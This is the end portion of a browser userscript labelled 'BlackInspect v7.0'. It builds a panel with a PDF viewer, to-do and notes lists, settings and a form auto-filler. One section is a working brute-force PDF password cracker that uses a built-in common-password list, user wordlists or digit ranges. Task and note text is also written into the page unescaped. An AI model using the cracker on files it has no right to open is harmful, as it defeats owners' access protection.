                        document.getElementById('rotate').onclick=function(){window.opener&&window.opener.biPdfRotate&&window.opener.biPdfRotate();};
                        document.getElementById('canvasWrap').addEventListener('wheel',function(e){
                            if(e.ctrlKey){e.preventDefault();window.opener&&window.opener.biPdfZoom&&window.opener.biPdfZoom(e.deltaY<0?0.1:-0.1);}
                        },{passive:false});
                    <\/script>
                    </body></html>`);
            pdfPopup.document.close();

            W.biPdfPrev = async () => {
              if (pdfPage > 1) {
                pdfPage--;
                await renderPdfPage(pdfPage);
              }
            };
            W.biPdfNext = async () => {
              if (pdfDoc && pdfPage < pdfDoc.numPages) {
                pdfPage++;
                await renderPdfPage(pdfPage);
              }
            };
            W.biPdfZoom = async (d) => {
              pdfScale = Math.max(0.5, Math.min(4, pdfScale + d));
              if (pdfPopup && !pdfPopup.closed) {
                const zv = pdfPopup.document.getElementById("zoomVal");
                if (zv) zv.textContent = Math.round(pdfScale * 100) + "%";
              }
              await renderPdfPage(pdfPage);
            };
            W.biPdfFit = async () => {
              if (!pdfDoc) return;
              const page = await pdfDoc.getPage(pdfPage);
              const vp = page.getViewport({ scale: 1 });
              const wrap = pdfPopup.document.getElementById("canvasWrap");
              if (wrap) pdfScale = (wrap.clientWidth / vp.width) * 0.95;
              await renderPdfPage(pdfPage);
            };
            W.biPdfRotate = async () => {
              await renderPdfPage(pdfPage);
            };

            await renderPdfPage(1);
            D.getElementById("pdfStatus").textContent =
              `✅ Loaded ${pdfDoc.numPages} page(s).`;
          } catch (e) {
            if (e.name === "PasswordException")
              D.getElementById("pdfStatus").textContent = "🔒 Wrong password.";
            else D.getElementById("pdfStatus").textContent = "❌ " + e.message;
          }
        };

        D.getElementById("pdfFileInput").onchange = async (e) => {
          const f = e.target.files[0];
          if (!f) return;
          const r = new FileReader();
          r.onload = async (ev) =>
            await openPdfPopup(
              new Uint8Array(ev.target.result),
              D.getElementById("pdfPass").value,
            );
          r.readAsArrayBuffer(f);
        };
        D.getElementById("loadPdfUrl").onclick = async () => {
          const url = D.getElementById("pdfUrl").value.trim();
          if (!url) return;
          D.getElementById("pdfStatus").textContent = "⏳ Fetching...";
          try {
            const r = await fetch(url);
            const buf = await r.arrayBuffer();
            await openPdfPopup(
              new Uint8Array(buf),
              D.getElementById("pdfPass").value,
            );
          } catch (e) {
            D.getElementById("pdfStatus").textContent = "❌ " + e.message;
          }
        };
        D.getElementById("openPdf").onclick = async () => {
          const f = D.getElementById("pdfFileInput").files[0];
          if (f) {
            const r = new FileReader();
            r.onload = async (ev) =>
              await openPdfPopup(
                new Uint8Array(ev.target.result),
                D.getElementById("pdfPass").value,
              );
            r.readAsArrayBuffer(f);
          }
        };

        D.getElementById("crackFile").onchange = () =>
          (D.getElementById("crackWL").style.display = "block");
        D.getElementById("crackCommon").onchange = () => {
          D.getElementById("crackWL").style.display = "none";
          D.getElementById("digitRange").style.display = "none";
        };
        D.getElementById("crackDigit").onchange = () => {
          D.getElementById("digitRange").style.display = "flex";
          D.getElementById("crackWL").style.display = "none";
        };

        const COMMON_PW = [
          "123456",
          "password",
          "123456789",
          "12345",
          "qwerty",
          "abc123",
          "111111",
          "000000",
          "1234",
          "admin",
          "123123",
          "letmein",
          "pass",
          "test",
          "secret",
          "welcome",
          "login",
          "1234567",
          "12345678",
          "1234567890",
          "password1",
          "p@ssw0rd",
          "admin123",
          "pass123",
          "iloveyou",
          "dragon",
          "master",
          "monkey",
          "shadow",
          "sunshine",
          "princess",
        ];

        D.getElementById("startCrack").onclick = async () => {
          const fileInput = D.getElementById("pdfFileInput");
          if (!fileInput.files[0] && !pdfData) {
            D.getElementById("crackStatus").textContent = "⚠ Load a PDF first.";
            return;
          }
          pdfCrackStop = false;
          const st = D.getElementById("crackStatus");
          await loadPdfjs();
          let buf = pdfData;
          if (fileInput.files[0]) {
            const r = new FileReader();
            buf = await new Promise((res) => {
              r.onload = (e) => res(new Uint8Array(e.target.result));
              r.readAsArrayBuffer(fileInput.files[0]);
            });
          }
          let wordlist = [];
          if (D.getElementById("crackCommon").checked) {
            wordlist = COMMON_PW;
          } else if (D.getElementById("crackFile").checked) {
            const wf = D.getElementById("crackWL").files[0];
            if (!wf) {
              st.textContent = "⚠ Choose wordlist.";
              return;
            }
            const txt = await new Promise((r) => {
              const fr = new FileReader();
              fr.onload = (e) => r(e.target.result);
              fr.readAsText(wf);
            });
            wordlist = txt.split(/\r?\n/).filter((l) => l.trim());
          } else if (D.getElementById("crackDigit").checked) {
            const from = parseInt(D.getElementById("digitFrom").value) || 0;
            const to = parseInt(D.getElementById("digitTo").value) || 9999;
            const pad =
              String(D.getElementById("digitFrom").value || "").length || 4;
            for (let i = from; i <= to; i++)
              wordlist.push(String(i).padStart(pad, "0"));
          }
          st.textContent = `⏳ Trying ${wordlist.length} passwords...`;
          for (let i = 0; i < wordlist.length; i++) {
            if (pdfCrackStop) {
              st.textContent = "⏹ Stopped.";
              return;
            }
            const pw = wordlist[i];
            try {
              await pdfjsLib.getDocument({ data: buf, password: pw }).promise;
              st.innerHTML = `✅ ${T("Found! Password")}: <b style="color:#58a6ff;font-size:16px;">${pw}</b>`;
              D.getElementById("pdfPass").value = pw;
              return;
            } catch (e) {
              if (e.name !== "PasswordException") continue;
            }
            if (i % 30 === 0)
              st.textContent = `⏳ ${T("Trying")} [${i}/${wordlist.length}] ${pw}`;
            if (i % 5 === 0) await new Promise((r) => setTimeout(r, 0));
          }
          st.textContent = `❌ ${T("Not found")}`;
        };
        D.getElementById("stopCrack").onclick = () => (pdfCrackStop = true);
      } else if (tab === "Tasks") {
        c.innerHTML = `
            <div style="display:flex;gap:4px;margin-bottom:10px;">
                <button id="modeTask" class="bi-btn-blue" style="flex:1;">✅ Tasks</button>
                <button id="modeNote" class="bi-btn-dim" style="flex:1;">📝 Notes</button>
            </div>
            <div id="tasksArea"></div>
            <div id="notesArea" style="display:none;"></div>`;

        let taskMode = "task";

        const renderTasks = () => {
          const area = D.getElementById("tasksArea");
          if (!area) return;
          const todos = S.todos.filter((t) => t.type !== "note");
          area.innerHTML = `
                <div class="bi-card">
                    <h4>➕ ${T("Add Task")}</h4>
                    <input id="todoText" placeholder="${T("Task desc")}" style="margin-bottom:6px;">
                    <div class="bi-grid2" style="gap:6px;margin-bottom:6px;">
                        <div><label>${T("Due date")}</label><input type="datetime-local" id="todoTime"></div>
                        <div><label>${T("Notify in mins")}</label><div class="bi-row"><input id="todoMins" type="number" placeholder="30" style="flex:1;"><button id="setMins" class="bi-btn-dim" style="flex-shrink:0;">Set</button></div></div>
                    </div>
                    <label>${T("Priority")}</label>
                    <select id="todoPrio" style="margin-bottom:8px;">
                        <option value="none">${T("No priority")}</option>
                        <option value="low">🟢 ${T("Low")}</option>
                        <option value="medium">🟡 ${T("Medium")}</option>
                        <option value="high">🔴 ${T("High")}</option>
                    </select>
                    <button id="addTodo" class="bi-btn-blue" style="width:100%;">➕ ${T("Add")}</button>
                </div>
                <div class="bi-card">
                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;flex-wrap:wrap;gap:6px;">
                        <input id="taskSearch" placeholder="${T("Search tasks")}" style="width:180px;">
                        <div style="display:flex;gap:4px;">
                            <select id="taskSort" style="font-size:11px;padding:4px;">
                                <option value="created">${T("Created")}</option>
                                <option value="due">${T("Due")}</option>
                                <option value="priority">${T("Priority")}</option>
                            </select>
                            <button id="clearDone" class="bi-btn-dim" style="font-size:11px;padding:4px 8px;">✓ ${T("Clear done")}</button>
                            <button id="deleteAll" class="bi-btn-red" style="font-size:11px;padding:4px 8px;">🗑</button>
                        </div>
                    </div>
                    <div id="todoList"></div>
                </div>`;

          const renderList = () => {
            const lst = D.getElementById("todoList");
            if (!lst) return;
            let items = S.todos.filter((t) => t.type !== "note");
            const search = (
              D.getElementById("taskSearch")?.value || ""
            ).toLowerCase();
            if (search)
              items = items.filter((t) =>
                t.text.toLowerCase().includes(search),
              );
            const sort = D.getElementById("taskSort")?.value || "created";
            if (sort === "due")
              items.sort((a, b) => (a.time || Infinity) - (b.time || Infinity));
            else if (sort === "priority") {
              const pv = { high: 3, medium: 2, low: 1, none: 0 };
              items.sort(
                (a, b) =>
                  (pv[b.priority || "none"] || 0) -
                  (pv[a.priority || "none"] || 0),
              );
            } else items.sort((a, b) => (b.created || 0) - (a.created || 0));

            if (!items.length) {
              lst.innerHTML = `<div class="bi-empty"><span class="bi-empty-icon">✅</span>${T("No tasks")}</div>`;
              return;
            }
            const prioColors = {
              high: "#f85149",
              medium: "#d29922",
              low: "#3fb950",
              none: "#8b949e",
            };
            lst.innerHTML = items
              .map((t, origIdx) => {
                const realIdx = S.todos.indexOf(t);
                const pc = prioColors[t.priority || "none"];
                return `<div class="bi-todo-item" style="border-left:3px solid ${pc};">
                            <div style="display:flex;align-items:flex-start;gap:8px;">
                                <input type="checkbox" ${t.done ? "checked" : ""} style="margin-top:3px;" onchange="biToggleTodo(${realIdx},this.checked)">
                                <div style="flex:1;min-width:0;">
                                    <div style="color:${t.done ? "#8b949e" : "#c9d1d9"};text-decoration:${t.done ? "line-through" : "none"};word-break:break-word;">${t.text}</div>
                                    ${t.time ? `<div class="bi-muted">⏰ ${new Date(t.time).toLocaleString()}</div>` : ""}
                                </div>
                                <button class="bi-btn-red" style="padding:2px 7px;font-size:11px;flex-shrink:0;" onclick="biDeleteTodo(${realIdx})">✕</button>
                            </div>
                        </div>`;
              })
              .join("");
          };

          D.getElementById("setMins").onclick = () => {
            const m = parseInt(D.getElementById("todoMins").value);
            if (!isNaN(m) && m > 0) {
              const t = new Date(Date.now() + m * 60000);
              D.getElementById("todoTime").value = t.toISOString().slice(0, 16);
            }
          };
          D.getElementById("addTodo").onclick = () => {
            const text = D.getElementById("todoText").value.trim();
            if (!text) return;
            const timeVal = D.getElementById("todoTime").value;
            const arr = S.todos;
            arr.push({
              type: "task",
              text,
              time: timeVal ? new Date(timeVal).getTime() : null,
              priority: D.getElementById("todoPrio").value,
              done: false,
              notified: false,
              created: Date.now(),
            });
            S.todos = arr;
            D.getElementById("todoText").value = "";
            D.getElementById("todoTime").value = "";
            D.getElementById("todoMins").value = "";
            renderList();
          };
          D.getElementById("taskSearch").oninput = renderList;
          D.getElementById("taskSort").onchange = renderList;
          D.getElementById("clearDone").onclick = () => {
            S.todos = S.todos.filter((t) => !t.done || t.type === "note");
            renderList();
          };
          D.getElementById("deleteAll").onclick = () => {
            if (confirm("Delete all tasks?")) {
              S.todos = S.todos.filter((t) => t.type === "note");
              renderList();
            }
          };
          renderList();
        };

        const renderNotes = () => {
          const area = D.getElementById("notesArea");
          if (!area) return;
          const COLORS = [
            "#f0c674",
            "#a8e6cf",
            "#aed9e0",
            "#ffd3b6",
            "#c3aed6",
            "#d4e8c2",
            "#f5f5f5",
            "#2d2d2d",
          ];
          area.innerHTML = `
                <div class="bi-card">
                    <h4>📝 ${T("Add Note")}</h4>
                    <textarea id="noteText" placeholder="Note..." style="height:80px;resize:vertical;margin-bottom:6px;"></textarea>
                    <div class="bi-row" style="flex-wrap:wrap;gap:4px;margin-bottom:8px;">
                        ${COLORS.map((col) => `<div onclick="D.getElementById('selColor').value='${col}'" style="width:20px;height:20px;background:${col};border-radius:4px;cursor:pointer;border:2px solid transparent;" onmouseenter="this.style.borderColor='#58a6ff'" onmouseleave="this.style.borderColor='transparent'"></div>`).join("")}
                    </div>
                    <input id="selColor" value="#f0c674" style="display:none;">
                    <button id="addNote" class="bi-btn-blue" style="width:100%;">📝 ${T("Add")}</button>
                </div>
                <div class="bi-card">
                    <div style="display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;gap:6px;">
                        <input id="noteSearch" placeholder="${T("Search notes")}" style="flex:1;">
                        <button id="deleteAllNotes" class="bi-btn-red" style="font-size:11px;padding:4px 8px;flex-shrink:0;">🗑 ${T("Delete all")}</button>
                    </div>
                    <div id="noteList" style="display:grid;grid-template-columns:1fr 1fr;gap:8px;"></div>
                </div>`;

          const renderNoteList = () => {
            const lst = D.getElementById("noteList");
            if (!lst) return;
            let notes = S.todos.filter((t) => t.type === "note");
            const search = (
              D.getElementById("noteSearch")?.value || ""
            ).toLowerCase();
            if (search)
              notes = notes.filter((n) =>
                n.text.toLowerCase().includes(search),
              );
            notes.sort((a, b) => (b.created || 0) - (a.created || 0));
            if (!notes.length) {
              lst.innerHTML = `<div class="bi-empty" style="grid-column:span 2;"><span class="bi-empty-icon">📝</span>${T("No notes")}</div>`;
              return;
            }
            lst.innerHTML = notes
              .map((n, i) => {
                const realIdx = S.todos.indexOf(n);
                const isDark = n.color === "#2d2d2d";
                return `<div style="background:${n.color || "#f0c674"};border-radius:8px;padding:10px;color:${isDark ? "#c9d1d9" : "#1a1a1a"};position:relative;">
                            <div style="font-size:12px;word-break:break-word;margin-bottom:20px;">${n.text}</div>
                            <div style="font-size:10px;opacity:.6;position:absolute;bottom:6px;left:8px;">${new Date(n.created || 0).toLocaleDateString()}</div>
                            <button onclick="biDeleteTodo(${realIdx})" style="position:absolute;bottom:4px;right:6px;background:rgba(0,0,0,.2);border:none;border-radius:4px;color:${isDark ? "#c9d1d9" : "#333"};cursor:pointer;padding:2px 6px;font-size:11px;">✕</button>
                        </div>`;
              })
              .join("");
          };
          D.getElementById("addNote").onclick = () => {
            const text = D.getElementById("noteText").value.trim();
            if (!text) return;
            const arr = S.todos;
            arr.push({
              type: "note",
              text,
              color: D.getElementById("selColor").value,
              created: Date.now(),
            });
            S.todos = arr;
            D.getElementById("noteText").value = "";
            renderNoteList();
          };
          D.getElementById("noteSearch").oninput = renderNoteList;
          D.getElementById("deleteAllNotes").onclick = () => {
            if (confirm("Delete all notes?")) {
              S.todos = S.todos.filter((t) => t.type !== "note");
              renderNoteList();
            }
          };
          renderNoteList();
        };

        W.biToggleTodo = (idx, val) => {
          const arr = S.todos;
          if (arr[idx]) arr[idx].done = val;
          S.todos = arr;
        };
        W.biDeleteTodo = (idx) => {
          const arr = S.todos;
          arr.splice(idx, 1);
          S.todos = arr;
          if (taskMode === "task") renderTasks();
          else renderNotes();
        };

        D.getElementById("modeTask").onclick = () => {
          taskMode = "task";
          D.getElementById("tasksArea").style.display = "";
          D.getElementById("notesArea").style.display = "none";
          D.getElementById("modeTask").className = "bi-btn-blue";
          D.getElementById("modeNote").className = "bi-btn-dim";
          renderTasks();
        };
        D.getElementById("modeNote").onclick = () => {
          taskMode = "note";
          D.getElementById("tasksArea").style.display = "none";
          D.getElementById("notesArea").style.display = "";
          D.getElementById("modeTask").className = "bi-btn-dim";
          D.getElementById("modeNote").className = "bi-btn-blue";
          renderNotes();
        };

        renderTasks();
        if ("Notification" in W && Notification.permission === "default")
          Notification.requestPermission();
      } else if (tab === "Settings") {
        c.innerHTML = `
            <div class="bi-grid2">
            <div>
                <div class="bi-card">
                    <h4>🌐 ${T("UI Language")}</h4>
                    <select id="langSel" style="margin-bottom:8px;">
                        <option value="en" ${S.uiLang === "en" ? "selected" : ""}>English</option>
                        <option value="fa" ${S.uiLang === "fa" ? "selected" : ""}>فارسی</option>
                    </select>
                    <button id="applyLang" class="bi-btn-blue" style="width:100%;">${T("Apply")}</button>
                </div>
                <div class="bi-card">
                    <h4>🎨 ${T("Font Family")}</h4>
                    <select id="fontSel" style="margin-bottom:8px;">
                        ${FONTS.map((f) => `<option value="${f.name}" ${S.fontFamily === f.name ? "selected" : ""}>${f.name}</option>`).join("")}
                    </select>
                    <label>${T("Font Size")}: <b id="fsVal">${S.fontSize}</b>px</label>
                    <input type="range" id="fsSlider" min="8" max="18" value="${S.fontSize}" style="width:100%;margin-bottom:8px;" oninput="document.getElementById('fsVal').textContent=this.value;document.getElementById('bi-font-style').textContent=\`#${BS},#${BS} *{font-family:'${S.fontFamily}',Consolas,monospace!important;font-size:\${this.value}px!important;}\`">
                    <button id="saveFont" class="bi-btn-dim" style="width:100%;">💾 Save Font</button>
                </div>
                <div class="bi-card">
                    <h4>🔆 ${T("Panel Opacity")}: <b id="opVal">${S.panelOpacity}</b></h4>
                    <input type="range" id="opSlider" min="0.2" max="1" step="0.05" value="${S.panelOpacity}" style="width:100%;" oninput="document.getElementById('opVal').textContent=this.value;document.getElementById('${BS}').style.opacity=this.value;">
                    <button id="saveOp" class="bi-btn-dim" style="width:100%;margin-top:8px;">💾 Save</button>
                </div>
            </div>
            <div>
                <div class="bi-card">
                    <h4>🐍 ${T("Kernel URL")}</h4>
                    <input id="kernelUrlIn" value="${S.kernelUrl}" style="margin-bottom:6px;">
                    <div class="bi-row">
                        <button id="saveKernel" class="bi-btn-dim" style="flex:1;">💾 Save</button>
                        <button id="testKernel" class="bi-btn-blue" style="flex:1;">🔗 ${T("Test Kernel")}</button>
                    </div>
                    <div id="kernelStatus" class="bi-status ${S.kernelOnline ? "bi-ok" : "bi-err"}">${S.kernelOnline ? T("Kernel online") : T("Kernel offline")}</div>
                </div>
                <div class="bi-card">
                    <h4>⚙ Misc</h4>
                    <div class="bi-check-row"><input type="checkbox" id="ctxToggle" ${S.customCtx ? "checked" : ""}><label for="ctxToggle">${T("Custom Right-Click")}</label></div>
                    <hr class="bi-sep">
                    <button id="resetPos" class="bi-btn-dim" style="width:100%;margin-bottom:4px;">${T("Reset Position")}</button>
                </div>
                <div class="bi-card">
                    <h4>👤 ${T("Form Profile")}</h4>
                    <label>${T("Full Name")}</label><input id="pfName" value="${S.fillProfile.name || ""}" style="margin-bottom:4px;">
                    <label>${T("Email")}</label><input id="pfEmail" value="${S.fillProfile.email || ""}" style="margin-bottom:4px;">
                    <label>${T("Phone")}</label><input id="pfPhone" value="${S.fillProfile.phone || ""}" style="margin-bottom:4px;">
                    <div class="bi-row">
                        <button id="saveProf" class="bi-btn-blue" style="flex:1;">💾 ${T("Save Profile")}</button>
                        <button id="fillForms" class="bi-btn-orange" style="flex:1;">⚡ ${T("Fill Forms")}</button>
                    </div>
                    <div id="profStatus" class="bi-status bi-ok"></div>
                </div>
            </div>
            </div>`;

        D.getElementById("applyLang").onclick = () => {
          S.uiLang = D.getElementById("langSel").value;
          panel.remove();
          panel = null;
          createPanel();
        };
        D.getElementById("fontSel").onchange = function () {
          S.fontFamily = this.value;
          loadFont(this.value);
          const fst = D.getElementById("bi-font-style");
          if (fst)
            fst.textContent = `#${BS},#${BS} *{font-family:'${this.value}',Consolas,monospace!important;font-size:${S.fontSize}px!important;}`;
        };
        D.getElementById("saveFont").onclick = () => {
          S.fontFamily = D.getElementById("fontSel").value;
          S.fontSize = parseInt(D.getElementById("fsSlider").value);
        };
        D.getElementById("saveOp").onclick = () => {
          S.panelOpacity = parseFloat(D.getElementById("opSlider").value);
        };
        D.getElementById("saveKernel").onclick = () => {
          S.kernelUrl = D.getElementById("kernelUrlIn").value.trim();
          D.getElementById("kernelStatus").textContent = "✅ Saved.";
          D.getElementById("kernelStatus").className = "bi-status bi-ok";
        };
        D.getElementById("testKernel").onclick = async () => {
          S.kernelUrl = D.getElementById("kernelUrlIn").value.trim();
          try {
            const r = await fetch(S.kernelUrl + "/health");
            S.kernelOnline = r.ok;
            D.getElementById("kernelStatus").textContent = r.ok
              ? T("Kernel online")
              : T("Kernel offline");
            D.getElementById("kernelStatus").className =
              "bi-status " + (r.ok ? "bi-ok" : "bi-err");
            const dot = D.getElementById("bi-kernel-dot");
            if (dot) dot.style.background = r.ok ? "#3fb950" : "#f85149";
          } catch (e) {
            S.kernelOnline = false;
            D.getElementById("kernelStatus").textContent = T("Kernel offline");
            D.getElementById("kernelStatus").className = "bi-status bi-err";
            const dot = D.getElementById("bi-kernel-dot");
            if (dot) dot.style.background = "#f85149";
          }
        };
        D.getElementById("ctxToggle").onchange = function () {
          S.customCtx = this.checked;
        };
        D.getElementById("resetPos").onclick = resetPanelPos;
        D.getElementById("saveProf").onclick = () => {
          S.fillProfile = {
            name: D.getElementById("pfName").value,
            email: D.getElementById("pfEmail").value,
            phone: D.getElementById("pfPhone").value,
          };
          D.getElementById("profStatus").textContent =
            "✅ " + T("Profile saved");
        };
        D.getElementById("fillForms").onclick = () => {
          const p = S.fillProfile;
          let ct = 0;
          const fa = (attr, val) => {
            D.querySelectorAll("input:not([type=hidden]),textarea").forEach(
              (inp) => {
                const n = (
                  (inp.name || "") +
                  " " +
                  (inp.id || "") +
                  " " +
                  (inp.placeholder || "")
                ).toLowerCase();
                if (n.includes(attr)) {
                  inp.value = val;
                  inp.dispatchEvent(new Event("input", { bubbles: true }));
                  ct++;
                }
              },
            );
          };
          if (p.name) fa("name", p.name);
          if (p.email) {
            fa("email", p.email);
            fa("mail", p.email);
          }
          if (p.phone) {
            fa("phone", p.phone);
            fa("mobile", p.phone);
            fa("tel", p.phone);
          }
          D.getElementById("profStatus").textContent =
            `✅ ${ct} fields filled.`;
        };
      }
    }

    showTab(S.activeTab);
    applyFont();
  }

  const launcher = D.createElement("div");
  launcher.id = "bi-launcher";
  launcher.style.cssText = `
    position:fixed;bottom:20px;right:20px;z-index:2147483647;
    background:#1f6feb;color:#fff;width:44px;height:44px;border-radius:50%;
    display:flex;align-items:center;justify-content:center;
    cursor:pointer;font-size:22px;
    box-shadow:0 4px 20px rgba(31,111,235,0.5);
    direction:ltr;transition:background .2s,transform .1s;
    user-select:none;
`;
  launcher.textContent = "⚙";
  launcher.title = "BlackInspect v7.0";
  launcher.onmouseenter = () => (launcher.style.background = "#388bfd");
  launcher.onmouseleave = () => (launcher.style.background = "#1f6feb");
  launcher.onclick = () => {
    if (!panel) createPanel();
    else panel.style.display = panel.style.display === "none" ? "flex" : "none";
  };
  D.addEventListener("DOMContentLoaded", () => D.body?.appendChild(launcher));
  if (D.body) D.body.appendChild(launcher);
  else
    D.addEventListener("DOMContentLoaded", () => D.body.appendChild(launcher));
})();
